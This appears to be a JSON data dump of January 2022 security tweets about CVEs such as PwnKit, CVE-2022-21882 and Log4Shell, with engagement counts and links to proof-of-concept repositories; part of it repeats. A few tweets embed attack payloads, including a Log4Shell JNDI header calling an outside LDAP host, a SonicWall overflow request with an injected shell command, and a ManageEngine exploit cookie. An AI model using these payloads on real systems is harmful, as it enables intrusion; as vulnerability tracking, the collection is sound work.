+    "tweetretweets": 26,
+    "tweettext": "CVE-2022-21882: win32k LPE bypass CVE-2021-1732\ncc @kalendsi \nPoC\nhttps://t.co/m3dol7UeFp https://t.co/g296ypQl6m",
+    "tweettime": "2022-01-27, 15:11:24",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1486718487959465991",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 84,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 29,
+    "tweettext": "Pwnkit: Linux Local Privilege Escalation POC - Polkit Pkexec (CVE-2021-4034)\n\nAnother local privilege escalation comes out that affects most Linux distros out there. This CVE came out last year and the POC and update just got released today.\n\nA thread🧵 https://t.co/a4md2P9smc",
+    "tweettime": "2022-01-27, 08:04:16",
+    "tweeturl": "https://twitter.com/xtremepentest/status/1486610996080914432",
+    "username": "xtremepentest"
+}
+{
+    "expanded_url": [
+        "https://transfer.sh/JDDmFj/pk"
+    ],
+    "tweetfavorites": 122,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 21,
+    "tweettext": "CVE-2021-4034 - Statically Linked Binary\n-\nResearchers from @Qualys discovered a 12 year old LPE vulnerability in polkit’s pkexec component .\n-\nFile: https://t.co/7GU2GVd60e\n-\nCredit will be added when I get it!\n-\n#CyberSecurity #infosec #bugbounty #CTF #CVE https://t.co/RnHZOKtgfN",
+    "tweettime": "2022-01-27, 01:49:31",
+    "tweeturl": "https://twitter.com/0dayCTF/status/1486516690452164611",
+    "username": "0dayCTF"
+}
+{
+    "tweetfavorites": 46,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 11,
+    "tweettext": "For those keeping score, Microsoft's CVE-2022-21882 is the first publicly documented in-the-wild 0day for 2022.\n\nHere's confirmation buried in a bulletin update: https://t.co/SgenOKY7qR",
+    "tweettime": "2022-01-26, 22:41:59",
+    "tweeturl": "https://twitter.com/ryanaraine/status/1486469495354843145",
+    "username": "ryanaraine"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2022-0332"
+    ],
+    "tweetfavorites": 310,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 90,
+    "tweettext": "CVE-2022-0332: Moodle 3.11 to 3.11.4 - SQL injection\n\nPoC\nhttps://t.co/KEMstBeUPV https://t.co/y6vnoGaAdl",
+    "tweettime": "2022-01-26, 20:31:39",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1486436693888667651",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 6,
+    "tweettext": "Apple shared the credit for CVE-2022-22583 between @patch1t and myself. \nMy exploit is a SIP bypass, using Apple-signed packages (similar to \"shrootless\" by @yo_yo_yo_jbo) and mounting (inspired by @theevilbit research), so thanks for both\n\nWriteup is coming soon. https://t.co/iLefGdt76E",
+    "tweettime": "2022-01-26, 19:33:32",
+    "tweeturl": "https://twitter.com/ronhass7/status/1486422068329603089",
+    "username": "ronhass7"
+}
+{
+    "expanded_url": [
+        "https://github.com/ly4k/PwnKit"
+    ],
+    "tweetfavorites": 448,
+    "tweetquotes": 7,
+    "tweetreplies": 1,
+    "tweetretweets": 186,
+    "tweettext": "Created a self-contained exploit for CVE-2021-4034 (1-day Pkexec Local Privilege Escalation). Should work out of the box on Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.\n\nhttps://t.co/M0IoDDVneK",
+    "tweettime": "2022-01-26, 14:31:42",
+    "tweeturl": "https://twitter.com/ly4k_/status/1486346108964159496",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://seclists.org/oss-sec/2022/q1/80"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 9,
+    "tweettext": "PwnKit vulnerability and exploitation is just pure gold! \n\nCVE-2021-4034: LPE in pkexec\n\nhttps://t.co/9YdT41TWP9",
+    "tweettime": "2022-01-26, 09:48:32",
+    "tweeturl": "https://twitter.com/RabbitPro/status/1486274848737443840",
+    "username": "RabbitPro"
+}
+{
+    "expanded_url": [
+        "https://github.com/arthepsy/CVE-2021-4034"
+    ],
+    "tweetfavorites": 73,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "GitHub - arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) - https://t.co/gYMyeNlGlz",
+    "tweettime": "2022-01-26, 03:28:41",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1486179258515210240",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 546,
+    "tweetquotes": 17,
+    "tweetreplies": 13,
+    "tweetretweets": 99,
+    "tweettext": "Why compile, when you can just pipe curl to bash?? 🤣😂🤣CVE-2021-4034 https://t.co/zUBAFzMGZR",
+    "tweettime": "2022-01-26, 01:07:54",
+    "tweeturl": "https://twitter.com/_JohnHammond/status/1486143827262033920",
+    "username": "_JohnHammond"
+}
+{
+    "expanded_url": [
+        "https://twitter.com/HaifeiLi/status/1458144361561034756",
+        "https://www.trellix.com/en-gb/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html"
+    ],
+    "tweetfavorites": 100,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 31,
+    "tweettext": "Remember in November Patch Tuesday Microsoft fixed an Excel zero-day attack in the wild (CVE-2021-42292) but no details shared (https://t.co/UN3bNYg8Tg)? Well, after reading the Trellix (formerly McAfee) blogpost https://t.co/TYsBZlbwMX, I think I figured it out.:). A thread.",
+    "tweettime": "2022-01-26, 00:25:47",
+    "tweeturl": "https://twitter.com/HaifeiLi/status/1486133229614616577",
+    "username": "HaifeiLi"
+}
+{
+    "tweetfavorites": 306,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 80,
+    "tweettext": "The exploit for CVE-2021-4034 is both simple and universal.  What's not to love? https://t.co/ZRsbd0So53",
+    "tweettime": "2022-01-25, 22:39:44",
+    "tweeturl": "https://twitter.com/wdormann/status/1486106541665226753",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/01/25/14"
+    ],
+    "tweetfavorites": 697,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 197,
+    "tweettext": "Now that the discoverers have published their exploit and writeup, I sent my exploit and writeup for CVE-2022-0185 (Linux kernel integer underflow to slab OOB write) to the oss-security mailing list: https://t.co/ZREvAFG3Xd https://t.co/trNCNNWLdM",
+    "tweettime": "2022-01-25, 21:50:52",
+    "tweeturl": "https://twitter.com/lockedbyte/status/1486094243210878978",
+    "username": "lockedbyte"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/01/25/11"
+    ],
+    "tweetfavorites": 303,
+    "tweetquotes": 9,
+    "tweetreplies": 0,
+    "tweetretweets": 100,
+    "tweettext": "The @qualys team is back at it!\n\npwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)\n\nhttps://t.co/of1WtdEJmK https://t.co/qAdWtuICqB",
+    "tweettime": "2022-01-25, 21:21:42",
+    "tweeturl": "https://twitter.com/0xdea/status/1486086902986035207",
+    "username": "0xdea"
+}
+{
+    "tweetfavorites": 81,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 30,
+    "tweettext": "Some attempts itw on CVE-2021-20038 (SonicWall SMA RCE). Also some password spraying of default passwords from the past few days\n\nRemember to update AND change default passwords :) https://t.co/WyDIXVKb4m",
+    "tweettime": "2022-01-24, 17:52:20",
+    "tweeturl": "https://twitter.com/buffaloverflow/status/1485671824725786633",
+    "username": "buffaloverflow"
+}
+{
+    "expanded_url": [
+        "https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/"
+    ],
+    "tweetfavorites": 406,
+    "tweetquotes": 7,
+    "tweetreplies": 6,
+    "tweetretweets": 176,
+    "tweettext": "Our first blog post is up! \n\nCVE-2021-45467: Preauth RCE in CentOS Web Panel affecting 200k+ web servers on Shodan (pls patch). We bypass strstr() based LFI protection and put a shell on the server. \nhttps://t.co/DvyakBkajj #bugbounty #bugbountytip https://t.co/0Z0cPU6HFl",
+    "tweettime": "2022-01-22, 04:05:04",
+    "tweeturl": "https://twitter.com/OctagonNetworks/status/1484738862865739782",
+    "username": "OctagonNetworks"
+}
+{
+    "tweetfavorites": 561,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 181,
+    "tweettext": "CVE-2021-44515 - Reset the admin password unauthenticated and login!\n\nPoC: https://t.co/IyGdbZ89AU",
+    "tweettime": "2022-01-21, 16:32:50",
+    "tweeturl": "https://twitter.com/steventseeley/status/1484564654219272195",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://packetstormsecurity.com/files/165642/VMware-vCenter-Server-Unauthenticated-Log4Shell-JNDI-Injection-Remote-Code-Execution.html"
+    ],
+    "tweetfavorites": 332,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 130,
+    "tweettext": "VMware vCenter Server Unauthenticated Log4Shell JNDI Injection RCE (CVE-2021-44228)\n\nGET /websso/SAML2/SLO/vsphere.local?SAMLRequest= HTTP/1.1\nX-Forwarded-For: ${jndi:ldap://10.10.10.10:1389/Exploit}\n\nhttps://t.co/NDKkQK3csc",
+    "tweettime": "2022-01-21, 07:13:22",
+    "tweeturl": "https://twitter.com/wugeej/status/1484423859797622784",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/01/microsoft-hackers-exploiting-new.html"
+    ],
+    "tweetfavorites": 133,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 115,
+    "tweettext": "#Microsoft has detected hackers exploiting a new zero-day vulnerability (CVE-2021-35247) in #SolarWinds Serv-U software related to #Log4j attacks.\n\nRead: https://t.co/Cc6iyLZ7RS\n\nServ-U version 15.3 has been released to patch the issue.\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-01-20, 05:00:38",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1484028070692782083",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://vuls.cert.org/confluence/display/Wiki/2021/06/21/Finding+Privilege+Escalation+Vulnerabilities+in+Windows+using+Process+Monitor"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 61,
+    "tweettext": "Reminder:\nFinding privilege escalation vulnerabilities in Windows using Process Monitor is perhaps the easiest way to find a vulnerability, ever.\nSee CVE-2022-0166\nhttps://t.co/cHg2W0khSS https://t.co/8amdUcprgj",
+    "tweettime": "2022-01-19, 13:48:39",
+    "tweeturl": "https://twitter.com/wdormann/status/1483798563092107266",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21907",
+        "https://github.com/antx-code/CVE-2022-21907"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 63,
+    "tweettext": "CVE-2022-21907: HTTP Protocol Stack Remote Code Execution Vulnerability\nhttps://t.co/z2Jwhy3OU3\nPoC\nhttps://t.co/PEg6bHlccW https://t.co/xGWChBTroc",
+    "tweettime": "2022-01-18, 18:14:10",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1483502992959623168",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 135,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 38,
+    "tweettext": "[#thread 🧵] Last week in #Microsoft #PatchTuesday, a critical vulnerability was patched that theoretically allows attackers to achieve Remote Code Execution on a target #IIS server (CVE-2022-21907). I'll explain how it works in this thread ⬇️ https://t.co/edEpUSq7uv",
+    "tweettime": "2022-01-18, 16:57:12",
+    "tweeturl": "https://twitter.com/podalirius_/status/1483483624045481992",
+    "username": "podalirius_"
+}
+{
+    "expanded_url": [
+        "https://github.com/antx-code/CVE-2022-21907"
+    ],
+    "tweetfavorites": 96,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 36,
+    "tweettext": "Windows HTTP Stack Remote Code Execution Vulnerability CVE-2022-21907 https://t.co/5cKhVR6HqR",
+    "tweettime": "2022-01-18, 15:35:16",
+    "tweeturl": "https://twitter.com/Dinosn/status/1483463004578590730",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://blog.assetnote.io/2022/01/17/workspace-one-access-ssrf/"
+    ],
+    "tweetfavorites": 125,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "A few months ago, we discovered a post-auth SSRF in VMWare Workspace One Access - CVE-2021-22056 - which allowed you to steal an admin JWT via CSRF or request arbitrary URLs. Check out our blog post!  https://t.co/q0UdqFsgMJ",
+    "tweettime": "2022-01-18, 02:46:49",
+    "tweeturl": "https://twitter.com/infosec_au/status/1483269616785063936",
+    "username": "infosec_au"
+}
+{
+    "expanded_url": [
+        "https://hulkvision.github.io/blog/post1/"
+    ],
+    "tweetfavorites": 397,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 117,
+    "tweettext": "RCE in Adobe Acrobat Reader for Android (CVE-2021-40724)\n\n$10,000 bounty received from GPSRP\n\nExcellent exploitation and write-up by @hulkvision \nReport: https://t.co/NIFQnlbRiZ\n\nQuick summary how it was achieved👇 https://t.co/Ge1qKac98L",
+    "tweettime": "2022-01-14, 13:02:31",
+    "tweeturl": "https://twitter.com/LukasStefanko/status/1481975013884452867",
+    "username": "LukasStefanko"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/rJw4DFI2RQ/cve-2021-44515/rapid7-analysis"
+    ],
+    "tweetfavorites": 74,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "Analysis and PoC for ManageEngine Desktop Central CVE-2021-44515.\n\nSTATE_COOKIE=&amp;_REQS/_TIME/123\n\nhttps://t.co/bk9UyPDLI8",
+    "tweettime": "2022-01-14, 09:47:57",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1481926048065495041",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 1742,
+    "tweetquotes": 13,
+    "tweetreplies": 41,
+    "tweetretweets": 223,
+    "tweettext": "i'll admit - when i found it, i wasn't totally sure if i could get LPE with this strange little kernel bug alone. it took triggering the vuln 4x to do a full privesc with #CVE-2021-41073, a vuln in io_uring. blog post soon :) https://t.co/2dJKDMLdUv",
+    "tweettime": "2022-01-12, 23:43:32",
+    "tweeturl": "https://twitter.com/chompie1337/status/1481411553698238465",
+    "username": "chompie1337"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis?fbclid=IwAR1ldORiwotSY0HeF_aLrYra1LuvJk7nlzfWg1HOT8AvnnvBfVcvUE1siTw"
+    ],
+    "tweetfavorites": 670,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 250,
+    "tweettext": "Sonicwall SSL VPN nobody BOF RCE (CVE-2021-20038)\n\nGET /%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%64%b8%06%08;{touch,/tmp/lol};%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%64%b8%06%08;{touch,/tmp/lol};?aaaaaaaa...\n\nhttps://t.co/y7NggxNg1I https://t.co/UjS8nqhUHr",
+    "tweettime": "2022-01-12, 06:56:52",
+    "tweeturl": "https://twitter.com/wugeej/status/1481158216390426628",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/01/first-patch-tuesday-of-2022-brings-fix.html"
+    ],
+    "tweetfavorites": 163,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 119,
+    "tweettext": "First #Microsoft Patch Tuesday update of 2022 fixes 96 new vulnerabilities, including a critical \"wormable\" Windows RCE #vulnerability (CVE-2022-21907) in the HTTP Protocol Stack.\n\nRead details: https://t.co/GNeuIIB6m2\n\n#infosec #cybersecurity",
+    "tweettime": "2022-01-12, 06:47:23",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1481155830179581952",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 98,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 22,
+    "tweettext": "First patch Tuesday of 2022! Adobe and Microsoft fixed 6 vulnerabilities reported by Kunlun lab. Two of them were demoed @TianfuCup. The CVE-2021-44706 was the RCE of PDF reader full chain and the CVE-2021-21881 was the Ntoskrnl bug for Chrome sandbox escape.",
+    "tweettime": "2022-01-11, 20:07:11",
+    "tweeturl": "https://twitter.com/mj0011sec/status/1480994719560003584",
+    "username": "mj0011sec"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/9szJhq46lw/cve-2021-20039/rapid7-analysis?referrer=twitter"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 18,
+    "tweettext": "Today, @rapid7 disclosed five zero-day vulnerabilities in SonicWall SMA 100 series devices. Technical analysis for CVE-2021-20038 (unauth stack-based buffer overflow) and CVE-2021-20039 (auth command injection) now in AttackerKB via @Junior_Baines. https://t.co/fEtmHEW94z",
+    "tweettime": "2022-01-11, 14:04:08",
+    "tweeturl": "https://twitter.com/AttackerKb/status/1480903355996250112",
+    "username": "AttackerKb"
+}
+{
+    "expanded_url": [
+        "https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/"
+    ],
+    "tweetfavorites": 681,
+    "tweetquotes": 23,
+    "tweetreplies": 14,
+    "tweetretweets": 386,
+    "tweettext": "We have observed a China-based ransomware operator that we’re tracking as DEV-0401 exploiting the CVE-2021-44228 vulnerability in Log4j 2 (aka #log4shell) targeting internet-facing systems running VMWare Horizon. https://t.co/6GOdRwRTjk",
+    "tweettime": "2022-01-11, 02:37:30",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1480730559739359233",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 27,
+    "tweettext": "Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit https://t.co/5LSpD8bK60  #Pentesting #CVE #RCE #Exploit #CyberSecurity #Infosec https://t.co/UYQmZG2h3U",
+    "tweettime": "2022-01-09, 22:01:08",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1480298619454558215",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce"
+    ],
+    "tweetfavorites": 766,
+    "tweetquotes": 15,
+    "tweetreplies": 4,
+    "tweetretweets": 304,
+    "tweettext": "New research! Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit https://t.co/q2QwkRfrvM",
+    "tweettime": "2022-01-08, 18:15:27",
+    "tweeturl": "https://twitter.com/BillDemirkapi/status/1479879438036881417",
+    "username": "BillDemirkapi"
+}
+{
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 10,
+    "tweettext": "The Windows Active Directory Domain Services (AD DS) escalation vulnerability (CVE-2021-42287 and CVE-2021-42278 combined) is still being exploited in wild.\n\nIf u haven’t updated your windows server an attacker with normal credentials can escalate his privileges to Domain Admin.",
+    "tweettime": "2022-01-07, 12:33:50",
+    "tweeturl": "https://twitter.com/sunnynehrabro/status/1479431078532169729",
+    "username": "sunnynehrabro"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-31589.yaml",
+        "https://github.com/advisories/GHSA-fw8v-3m7h-4jwg"
+    ],
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "BeyondTrust / Bomgar Remote Support XSS (CVE-2021-31589) by @aboul3la\n\nTempalte: https://t.co/Y6VlsYzfIU\n\nReference: https://t.co/60P76u9WPA\n\n#hackwithautomation #bugbounty #pentest https://t.co/MKf8kPSN2S",
+    "tweettime": "2022-01-07, 09:03:16",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1479378090123927552",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://github.com/michalbednarski/ReparcelBug2"
+    ],
+    "tweetfavorites": 79,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Writeup and exploit for installed app to system privilege escalation on Android 12 Beta through CVE-2021-0928, a `writeToParcel`/`createFromParcel` serialization mismatch in `OutputConfiguration` https://t.co/bzoEWfTPIV &lt; Good read",
+    "tweettime": "2022-01-31, 17:13:49",
+    "tweeturl": "https://twitter.com/timstrazz/status/1488198848912658434",
+    "username": "timstrazz"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882"
+    ],
+    "tweetfavorites": 126,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 51,
+    "tweettext": "quickly tested the CVE-2022-21882 Win10 LPE PoC from @kalendsi before applying KB5009543 (which should patch it). works nicely on my 21H2 19044.1415.  https://t.co/gvozRBxeU1 https://t.co/f0zej818Lf",
+    "tweettime": "2022-01-30, 02:33:53",
+    "tweeturl": "https://twitter.com/an0n_r0/status/1487615017688211457",
+    "username": "an0n_r0"
+}
+{
+    "expanded_url": [
+        "https://github.com/k8gege/ZimbraExploit"
+    ],
+    "tweetfavorites": 43,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "Zimbra Mail System Vulnerability XE/RCE/SSRF/Upload GetShell Exploit 1. (CVE-2019-9621 Zimbra&lt;8.8.11 XXE GetShell Exploit)\n\nhttps://t.co/0TS616lEWL",
+    "tweettime": "2022-01-29, 17:53:15",
+    "tweeturl": "https://twitter.com/Alra3ees/status/1487483996250456078",
+    "username": "Alra3ees"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 44,
+    "tweettext": "CVE-2022-21882 LPE/bypass for CVE-2021-1732 exploit code:\n\nhttps://t.co/Uq4hDvLL69",
+    "tweettime": "2022-01-29, 13:56:27",
+    "tweeturl": "https://twitter.com/HackingDave/status/1487424405290561539",
+    "username": "HackingDave"
+}
+{
+    "tweetfavorites": 296,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 78,
+    "tweettext": "Yup.  This CVE-2022-21882 PoC works. https://t.co/cZA5eL8UpK",
+    "tweettime": "2022-01-28, 23:25:10",
+    "tweeturl": "https://twitter.com/wdormann/status/1487205136174878721",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2021-43789"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 2,
+    "tweettext": "https://t.co/hmvoldUrkg \nCVE-2021-43789 \nPrestashop &gt;= 1.7.5.0 &lt; 1.7.8.2 - SQL injection\norder[sortOrder] \norder[orderBy]",
+    "tweettime": "2022-01-28, 00:28:17",
+    "tweeturl": "https://twitter.com/numanturle/status/1486858633975631878",
+    "username": "numanturle"
+}
+{
+    "expanded_url": [
+        "https://github.com/ly4k/PwnKit"
+    ],
+    "tweetfavorites": 354,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 125,
+    "tweettext": "As if it couldn't get any simpler, I just added a one-liner exploit for CVE-2021-4034 to the repository https://t.co/M0IoDDVneK https://t.co/IcE4VwKQEd",
+    "tweettime": "2022-01-27, 20:34:19",
+    "tweeturl": "https://twitter.com/ly4k_/status/1486799755091058695",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://crowdsec.net/blog/pwnkit-avoid-privilege-escalation-with-crowdsec/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "Detect and alert on #PwnKit privilege escalation vulnerability with CrowdSec.\n\n@Crowd_Security published a collection targeting #Linux Local Privilege Escalation, and CVE-2021-4034 is its first scenario!\n\nhttps://t.co/25l80m9uLA\n\n#infosec",
+    "tweettime": "2022-01-27, 17:50:56",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1486758635552210944",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882#readme"
+    ],
+    "tweetfavorites": 71,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 26,
+    "tweettext": "CVE-2022-21882: win32k LPE bypass CVE-2021-1732\ncc @kalendsi \nPoC\nhttps://t.co/m3dol7UeFp https://t.co/g296ypQl6m",
+    "tweettime": "2022-01-27, 15:11:24",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1486718487959465991",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 84,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 29,
+    "tweettext": "Pwnkit: Linux Local Privilege Escalation POC - Polkit Pkexec (CVE-2021-4034)\n\nAnother local privilege escalation comes out that affects most Linux distros out there. This CVE came out last year and the POC and update just got released today.\n\nA thread🧵 https://t.co/a4md2P9smc",
+    "tweettime": "2022-01-27, 08:04:16",
+    "tweeturl": "https://twitter.com/xtremepentest/status/1486610996080914432",
+    "username": "xtremepentest"
+}
+{
+    "expanded_url": [
+        "https://transfer.sh/JDDmFj/pk"
+    ],
+    "tweetfavorites": 122,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 21,
+    "tweettext": "CVE-2021-4034 - Statically Linked Binary\n-\nResearchers from @Qualys discovered a 12 year old LPE vulnerability in polkit’s pkexec component .\n-\nFile: https://t.co/7GU2GVd60e\n-\nCredit will be added when I get it!\n-\n#CyberSecurity #infosec #bugbounty #CTF #CVE https://t.co/RnHZOKtgfN",
+    "tweettime": "2022-01-27, 01:49:31",
+    "tweeturl": "https://twitter.com/0dayCTF/status/1486516690452164611",
+    "username": "0dayCTF"
+}
+{
+    "tweetfavorites": 46,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 11,
+    "tweettext": "For those keeping score, Microsoft's CVE-2022-21882 is the first publicly documented in-the-wild 0day for 2022.\n\nHere's confirmation buried in a bulletin update: https://t.co/SgenOKY7qR",
+    "tweettime": "2022-01-26, 22:41:59",
+    "tweeturl": "https://twitter.com/ryanaraine/status/1486469495354843145",
+    "username": "ryanaraine"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2022-0332"
+    ],
+    "tweetfavorites": 310,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 90,
+    "tweettext": "CVE-2022-0332: Moodle 3.11 to 3.11.4 - SQL injection\n\nPoC\nhttps://t.co/KEMstBeUPV https://t.co/y6vnoGaAdl",
+    "tweettime": "2022-01-26, 20:31:39",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1486436693888667651",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 6,
+    "tweettext": "Apple shared the credit for CVE-2022-22583 between @patch1t and myself. \nMy exploit is a SIP bypass, using Apple-signed packages (similar to \"shrootless\" by @yo_yo_yo_jbo) and mounting (inspired by @theevilbit research), so thanks for both\n\nWriteup is coming soon. https://t.co/iLefGdt76E",
+    "tweettime": "2022-01-26, 19:33:32",
+    "tweeturl": "https://twitter.com/ronhass7/status/1486422068329603089",
+    "username": "ronhass7"
+}
+{
+    "expanded_url": [
+        "https://github.com/ly4k/PwnKit"
+    ],
+    "tweetfavorites": 448,
+    "tweetquotes": 7,
+    "tweetreplies": 1,
+    "tweetretweets": 186,
+    "tweettext": "Created a self-contained exploit for CVE-2021-4034 (1-day Pkexec Local Privilege Escalation). Should work out of the box on Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.\n\nhttps://t.co/M0IoDDVneK",
+    "tweettime": "2022-01-26, 14:31:42",
+    "tweeturl": "https://twitter.com/ly4k_/status/1486346108964159496",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://seclists.org/oss-sec/2022/q1/80"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 9,
+    "tweettext": "PwnKit vulnerability and exploitation is just pure gold! \n\nCVE-2021-4034: LPE in pkexec\n\nhttps://t.co/9YdT41TWP9",
+    "tweettime": "2022-01-26, 09:48:32",
+    "tweeturl": "https://twitter.com/RabbitPro/status/1486274848737443840",
+    "username": "RabbitPro"
+}
+{
+    "expanded_url": [
+        "https://github.com/arthepsy/CVE-2021-4034"
+    ],
+    "tweetfavorites": 73,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "GitHub - arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) - https://t.co/gYMyeNlGlz",
